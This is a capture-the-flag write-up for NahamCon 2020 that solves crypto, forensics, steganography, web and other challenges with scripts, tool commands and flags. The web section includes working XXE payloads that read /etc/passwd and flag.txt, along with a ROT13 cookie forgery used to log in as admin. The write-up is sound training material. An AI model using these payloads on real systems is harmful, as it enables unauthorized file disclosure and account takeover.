## nahamCon

11 - 14 June

# **CRYPTOGRAPHY**


### ooo-la-la

This is a basic rsa challenge with N, e, c given.


``` python
#!/usr/bin/python

from Crypto.Util.number import inverse, long_to_bytes

N = 3349683240683303752040100187123245076775802838668125325785318315004398778586538866210198083573169673444543518654385038484177110828274648967185831623610409867689938609495858551308025785883804091
e = 65537
c = 87760575554266991015431110922576261532159376718765701749513766666239189012106797683148334771446801021047078003121816710825033894805743112580942399985961509685534309879621205633997976721084983

p = 1830213987675567884451892843232991595746198390911664175679946063194531096037459873211879206428207
q = 1830213987675567884451892843232991595746198390911664175679946063194531096037459873211879206428213

phi = (p - 1)*( q - 1)
d = inverse(e, phi)
m = pow(c,d,N)
print(long_to_bytes(m))

```

flag{ooo_la_la_those_are_sexy_primes}


### homecooked

The  given file is a python script which printed the flag very slowly. The main culprit a is the a function, which verifies if a number is prime or not. 

``` python
import base64
num = 0
count = 0
cipher_b64 = b"MTAwLDExMSwxMDAsOTYsMTEyLDIxLDIwOSwxNjYsMjE2LDE0MCwzMzAsMzE4LDMyMSw3MDIyMSw3MDQxNCw3MDU0NCw3MTQxNCw3MTgxMCw3MjIxMSw3MjgyNyw3MzAwMCw3MzMxOSw3MzcyMiw3NDA4OCw3NDY0Myw3NTU0MiwxMDAyOTAzLDEwMDgwOTQsMTAyMjA4OSwxMDI4MTA0LDEwMzUzMzcsMTA0MzQ0OCwxMDU1NTg3LDEwNjI1NDEsMTA2NTcxNSwxMDc0NzQ5LDEwODI4NDQsMTA4NTY5NiwxMDkyOTY2LDEwOTQwMDA="

def a(num):
    if (num > 1):
        for i in range(2,num):
            if (num % i) == 0:
                return False
                break
        return True
    else:
        return False
       
def b(num):
    my_str = str(num)
    rev_str = reversed(my_str)
    if list(my_str) == list(rev_str):
       return True
    else:
       return False


cipher = base64.b64decode(cipher_b64).decode().split(",")

while(count < len(cipher)):
    if (a(num)):
        if (b(num)):
            print(chr(int(cipher[count]) ^ num), end='', flush=True)
            count += 1
            if (count == 13):
                num = 50000
            if (count == 26):
                num = 500000
    else:
        pass
    num+=1

print()

```


I took that program and modified and optimized the a function. After that the program printed the flag in a few seconds.

``` python

#!/usr/bin/python

import base64
num = 0
count = 0
cipher_b64 = b"MTAwLDExMSwxMDAsOTYsMTEyLDIxLDIwOSwxNjYsMjE2LDE0MCwzMzAsMzE4LDMyMSw3MDIyMSw3MDQxNCw3MDU0NCw3MTQxNCw3MTgxMCw3MjIxMSw3MjgyNyw3MzAwMCw3MzMxOSw3MzcyMiw3NDA4OCw3NDY0Myw3NTU0MiwxMDAyOTAzLDEwMDgwOTQsMTAyMjA4OSwxMDI4MTA0LDEwMzUzMzcsMTA0MzQ0OCwxMDU1NTg3LDEwNjI1NDEsMTA2NTcxNSwxMDc0NzQ5LDEwODI4NDQsMTA4NTY5NiwxMDkyOTY2LDEwOTQwMDA="

def isPrime(num):

    if (num > 1):
        if (num %2 == 0) or (num % 3 == 0):
            return False

        i = 5
        while(i * i <= num):
            if ( num % i == 0 ) or (num % (i + 2) == 0):
                return False
            i = i + 6

    return True 

        
       
def b(num):
    my_str = str(num)
    rev_str = reversed(my_str)
    if list(my_str) == list(rev_str):
       return True
    else:
       return False


cipher = base64.b64decode(cipher_b64).decode().split(",")

while(count < len(cipher)):
    if (isPrime(num)):
        if (b(num)):
            print(chr(int(cipher[count]) ^ num), end='', flush=True)
            count += 1
            if (count == 13):
                num = 50000
            if (count == 26):
                num = 500000
    else:
        pass
    num+=1

print()
```
flag{pR1m3s_4re_co0ler_Wh3n_pal1nDr0miC}


# **FORENSICS**

### Microsoft

I used binwalk to check if there are any hidden files within the document and it turns out there are plenty.
Using grep -r 'flag' i got the flag.
flag{oof_is_right_why_gfxdata_though}

### Cow pie 
I used foremost on the file given and in the extracted file was an image which contains the flag.
![alt text](https://github.com/Alex-Stinga/CTF/blob/master/2020/nahamCon/cow_pie/img.png)


# **SCRIPTING**

### Rotten

The following sometimes dropped the connection. I don;t know why. So i had to assemble the flag manually using the decoded values extracted.

``` python

#!/usr/bin/python

from pwn import *
import string
import re

alphabet = string.ascii_lowercase
initial = 'send back this line exactly. no flag here, just filler. '

def caesar(encoded):

	plaintext = ''

	for key in range(1, 25):
		for char in encoded:
			index = alphabet.find(char)

			if not char.isalpha():
				plaintext+= char
			else:
				index = index - key

				if index < 0:
					index = index + len(alphabet)
				plaintext = plaintext + alphabet[index]


		if 'send back' in plaintext:
			return plaintext


		# print(key, plaintext)
		plaintext = ''


con = remote('jh2i.com', 50034)
resend = con.recvline()
con.sendline(initial)


while True:

	received = con.recvline()
	print(received)

	if 'flag{' in received:
		print(received)
		break
	else:
		if len(received) == len(initial):
			con.sendline(initial)
		else:
			decoded = caesar(received)
			number = re.findall(r'\d+', decoded)                                            
			char = decoded[-3]

			print(number, char)
			positon = number[0]

			to_send = "send back this line exactly. character {} of the flag is '{}' ".format(positon, char)
			con.sendline(to_send)
	
```
flag{now_you_know_your_caesars}

# **STEGANOGRAPHY**

### Doh

I used steghide on the file and i didn't gave it any password. 
![alt text](https://github.com/Alex-Stinga/CTF/blob/master/2020/nahamCon/doh/doh.jpg)
![alt text](https://github.com/Alex-Stinga/CTF/blob/master/2020/nahamCon/doh/img.png)


### Old school

I used zsteg to check for all the posibilies of lsb steganography.  
![alt text](https://github.com/Alex-Stinga/CTF/blob/master/2020/nahamCon/old_school/hackers.bmp)
![alt text](https://github.com/Alex-Stinga/CTF/blob/master/2020/nahamCon/old_school/img.png)

JCTF{at_least_the_movie_is_older_than_this_software}


# **WARMUP**

### Read the rules

The flag is in the source page of the rules page. 
![alt text](https://github.com/Alex-Stinga/CTF/blob/master/2020/nahamCon/Read%20th%20rules/img.png)


### Clisay

I used the strings command on the executable given and found the flag scattered.
![alt text](https://github.com/Alex-Stinga/CTF/blob/master/2020/nahamCon/clisay/img.png)
flag{Y0u_c4n_r3Ad_M1nd5}

### Meatameme

I used exiftool and found the flag in the author comment.
![alt text](https://github.com/Alex-Stinga/CTF/blob/master/2020/nahamCon/metameme/hackermeme.jpg)
![alt text](https://github.com/Alex-Stinga/CTF/blob/master/2020/nahamCon/metameme/img.png)
flag{N0t_7h3_4cTuaL_Cr3At0r}

### Mr robot

The name of the challenge was suggestive, soo i went to /robots.txt .
![alt text](https://github.com/Alex-Stinga/CTF/blob/master/2020/nahamCon/mr%20robot/img.png)

### UGGC

I tried to log in as admin, and i couldn't. Looking at the cookie i noticed the value was shifted with ROT13. So to login i need to input the value admin already shifted.

![alt text](https://github.com/Alex-Stinga/CTF/blob/master/2020/nahamCon/uggc/img.png)
flag{H4cK_aLL_7H3_C0okI3s} 

### Pang

Again i used exiftool, and got the flag flag{wham_bam_thank_you_for_the_flag_maam} ,this time was in another label.
![alt text](https://github.com/Alex-Stinga/CTF/blob/master/2020/nahamCon/pang/img2.png)


# **WEB**

### Agent 95

I opened the dev tools and modified the request with the user-agent value with Agent 95, and the OS (second value from the paranthesis with Windows 95)
![alt text](https://github.com/Alex-Stinga/CTF/blob/master/2020/nahamCon/agent_95/img2.png)
The received page has the flag
![alt text](https://github.com/Alex-Stinga/CTF/blob/master/2020/nahamCon/agent_95/img22.png)

flag{user_agents_undercover}

### Localghost

I looked at source code and accesed "/jquery.jscroll2.js". I took the code given and pasted it into a jsbeautifier. 
![alt text](https://github.com/Alex-Stinga/CTF/blob/master/2020/nahamCon/localghost/img2.png)

This value, SkNURntzcG9vb29va3lfZ2hvc3RzX2luX3N0b3JhZ2V9,  is base64 enoded. Decoding it gives the flag.
JCTF{spoooooky_ghosts_in_storage}

### Extraterrestrial

I inputed gibberish first time, got the error 'end of document' so i though it may be xxe.

I tried to see the contents of /etc/passwd and definitely is xxe.

``` xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE netspi [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
  <content>&xxe;</content>
</root>
```


``` xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE netspi [<!ENTITY xxe SYSTEM "file:///flag.txt" >]>
<root>
  <content>&xxe;</content>
</root>
```

flag{extraterrestrial_extra_entities}

# **MISC**

### Fake file
![alt text](https://github.com/Alex-Stinga/CTF/blob/master/2020/nahamCon/fake%20file/img.png)

### Vortex

I connected to the given nc data and redirected all the bytes to a file. Then i used xxd to see the hex dump and lastly grep hopind i woul see the flag.

``` bash
nc jh2i.com 50017 > out.txt
xxd out.txt
```
flag{more_text_in_the_vortex}

# **MOBILE**

### Candroid

![alt text](https://github.com/Alex-Stinga/CTF/blob/master/2020/nahamCon/candroid/img.png)

### Simple app

![alt text](https://github.com/Alex-Stinga/CTF/blob/master/2020/nahamCon/simple_app/img.png)
flag{3asy_4ndr0id_r3vers1ng}
